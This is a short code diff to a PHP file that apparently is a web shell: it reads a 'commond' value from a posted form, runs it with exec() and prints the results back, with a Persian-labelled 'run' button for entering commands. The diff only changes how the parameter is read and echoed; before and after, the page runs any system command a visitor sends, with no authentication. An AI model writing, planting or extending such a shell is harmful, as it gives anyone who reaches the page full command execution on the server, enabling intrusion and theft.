@@ -1,7 +1,10 @@
-<?php
+<?php 
+//echo getcwd();
+$c = "";
 if(isset($_REQUEST['commond'])){
 	///////////////////
-exec($_REQUEST['commond'],$comm);
+	$c = $_POST['commond'];
+	exec($c,$comm);
 	echo "<br>RES: <br>";
 	echo implode("<br>\n",$comm);
 	echo "<br><br>";
@@ -9,7 +12,7 @@ exec($_REQUEST['commond'],$comm);
 
 	echo '
 	<form method="post">
-		<textarea colspan=20 rospan=20 name="commond" >'.$_REQUEST['commond'].'</textarea>
+		<textarea colspan=20 rospan=20 name="commond" >'.$c.'</textarea>
 		<input type="submit" value="اجرا" />
 	</form>
 	
